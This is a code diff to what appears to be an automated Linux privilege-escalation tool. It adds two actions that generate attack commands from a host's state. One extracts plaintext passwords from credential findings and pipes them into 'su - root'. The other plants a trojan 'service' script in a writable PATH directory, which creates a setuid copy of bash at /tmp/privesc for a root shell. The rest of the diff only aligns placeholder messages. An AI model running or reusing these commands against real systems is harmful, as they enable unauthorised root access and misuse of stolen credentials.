@@ -250,6 +250,48 @@ def build_exploit_commands(action: Action, state: HostState) -> List[str]:
             "uname -r && cat /proc/version",
         ]
 
+    if action == Action.EXPLOIT_CREDENTIALS:
+        cmds: List[str] = []
+        for cred_line in state.credentials_found[:10]:
+            lower = cred_line.lower()
+            # Look for plaintext passwords in env vars or config lines
+            if "=" in cred_line and any(kw in lower for kw in ("password", "passwd", "pass")):
+                # Try to extract the value after = 
+                value = cred_line.split("=", 1)[-1].strip().strip("'\"").strip()
+                if value and len(value) > 2:
+                    cmds.append(f"echo '{value}' | su - root 2>/dev/null")
+            elif "ssh" in lower and ("key" in lower or "id_rsa" in lower):
+                cmds.append("# SSH key found — try: ssh -i <key_path> root@localhost")
+        if not cmds:
+            cmds = [
+                "# Credentials found but no clear plaintext password extracted.",
+                "# Review credential findings and try: su - root",
+                "su - root",
+            ]
+        return cmds
+
+    if action == Action.EXPLOIT_WRITABLE:
+        cmds: List[str] = []
+        for wpath in state.writable_paths[:5]:
+            # Only exploit paths that are in PATH-like directories
+            if any(segment in wpath for segment in ("/usr/local/", "/usr/bin", "/usr/sbin", "/sbin", "/bin", "/opt")):
+                cmds.append(f"# Writable PATH dir: {wpath}")
+                cmds.append(
+                    f"echo '#!/bin/bash\ncp /bin/bash /tmp/privesc && chmod +s /tmp/privesc' > {wpath}/service"
+                    f" && chmod +x {wpath}/service"
+                )
+                cmds.append(
+                    "# Wait for a root process to call 'service', then: /tmp/privesc -p"
+                )
+                break
+        if not cmds:
+            cmds = [
+                "# Writable directories found but none in system PATH.",
+                "# Check if any writable dir is referenced in cron or systemd.",
+                "echo $PATH",
+            ]
+        return cmds
+
     return []
 
 
@@ -271,11 +313,13 @@ def get_commands(action: Action, state: Optional[HostState] = None) -> List[str]
 
     # No state provided — informational fallback
     _PLACEHOLDERS: Dict[Action, List[str]] = {
-        Action.EXPLOIT_SUDO:   ["# Run CHECK_SUDO first, then re-select EXPLOIT_SUDO"],
-        Action.EXPLOIT_SUID:   ["# Run CHECK_SUID first, then re-select EXPLOIT_SUID"],
-        Action.EXPLOIT_CAP:    ["# Run CHECK_CAPABILITIES first, then re-select EXPLOIT_CAP"],
-        Action.EXPLOIT_CRON:   ["# Run CHECK_CRON first, then re-select EXPLOIT_CRON"],
-        Action.EXPLOIT_KERNEL: ["# Run CHECK_KERNEL first, then re-select EXPLOIT_KERNEL"],
+        Action.EXPLOIT_SUDO:        ["# Run CHECK_SUDO first, then re-select EXPLOIT_SUDO"],
+        Action.EXPLOIT_SUID:        ["# Run CHECK_SUID first, then re-select EXPLOIT_SUID"],
+        Action.EXPLOIT_CAP:         ["# Run CHECK_CAPABILITIES first, then re-select EXPLOIT_CAP"],
+        Action.EXPLOIT_CRON:        ["# Run CHECK_CRON first, then re-select EXPLOIT_CRON"],
+        Action.EXPLOIT_KERNEL:      ["# Run CHECK_KERNEL first, then re-select EXPLOIT_KERNEL"],
+        Action.EXPLOIT_CREDENTIALS: ["# Run SEARCH_CREDENTIALS first, then re-select EXPLOIT_CREDENTIALS"],
+        Action.EXPLOIT_WRITABLE:    ["# Run CHECK_WRITABLE first, then re-select EXPLOIT_WRITABLE"],
     }
     return _PLACEHOLDERS.get(action, [])
 
